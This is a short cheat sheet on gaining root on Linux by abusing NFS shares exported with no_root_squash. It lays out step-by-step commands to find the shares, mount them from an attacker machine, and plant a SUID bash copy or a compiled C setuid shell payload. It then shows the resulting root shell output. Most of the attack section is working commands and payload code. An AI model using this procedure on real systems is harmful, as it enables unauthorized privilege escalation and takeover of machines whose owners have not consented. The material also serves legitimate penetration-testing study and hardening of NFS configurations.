# NFS exploits

Become root on Linux via NFS exploits:

1. Look for no_root_squash shares
2. Mount share
3. Create a payload
   * Bash binary with an SUID bit
   * C binary with an SUID bit
4. Execute the payload on the target mac hine to escalate privileges
5. Unmount the shared directory in the attacker machine

## Example: /tmp share

1. Get information:

```text
$ ps aux | grep nfsd
$ cat /etc/exports
```
There is a `/tmp` share with `no_root_squash` set.

2. Shares with the `no_root_squash` option can possibly be modified and executed as root.
3. On the attacker machine install the NFS client package: `sudo apt install nfs-common`
4. On the attacker machine, create a directory to host the NFS share: `mkdir /tmp/nfs`
5. With `sudo`, mount the remote share in the `/tmp/nfs` directory

```text
sudo mount -o rw,vers=2 <target IP address>:/tmp /tmp/nfs
```

Or:

```text
sudo mount -t nfs <target IP address>:/tmp /tmp/nfs
```
6. Payload 

Bash binary with an SUID bit:

```text
sudo cp /bin/bash /tmp/nfs/bash && sudo chmod u+s /tmp/nfs/bash
```

C binary with an SUID bit - you may need to change the `/usr/bin/bash` to `/bin/bash`, depending on location of `bash` in the target machine:

```text
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
	setresuid(0, 0, 0);
	setuid(getuid());
	system("/usr/bin/bash"); 
	return 0;
}
```

Compile:

```text
gcc payload.c -o payload && sudo rm /tmp/nfs/payload 2>/dev/null; sudo cp payload /tmp/nfs
```

Set de SUID bit:

```text
sudo chmod u+s /tmp/nfs/payload
```

7. In the target machine, execute the payload to escalate privileges:

```text
:/tmp$ ./bash -p
# whoami
root
# exit
```

```text
:/tmp$ ./payload 
:/tmp# id
uid=0(root) gid=1000(low) ...
```

8. Unmount the shared directory in the attacker machine:

```text
sudo umount /tmp/nfs
```

## Notes

The NFS configuration file is `/etc/exports`:

* `no_root_squash`: This option basically gives authority to the root user on the client (us, our attacker host) to access files on the NFS server as root. This is bad, as we can create malicious files on the NFS share as the root user.
* `no_all_squash`: This is similar to no_root_squash option but applies to non-root users.
